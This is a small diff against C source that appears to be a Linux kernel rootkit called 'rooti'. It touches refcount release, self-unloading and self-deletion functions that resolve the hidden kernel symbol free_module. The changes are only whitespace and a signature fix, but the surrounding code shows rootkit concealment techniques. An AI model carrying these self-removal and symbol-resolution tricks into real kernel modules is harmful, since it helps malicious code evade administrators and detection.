@@ -21,7 +21,7 @@ static int __try_release_module_ref(struct module *mod)
 	int ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
 	BUG_ON(ret < 0);
 	if (ret)
-		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);   
+		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);
 
 	return ret;
 }
@@ -79,7 +79,7 @@ static int rooti_schedule_self_unloading(void) {
 	return 0;
 }
 
-int rooti_schedule_self_deletion()
+int rooti_schedule_self_deletion(void)
 {
 	ROOTI_RESOLVE_SYM_ADDR(free_module_t, free_module, -ENOENT);
 	free_module_ptr = __free_module;
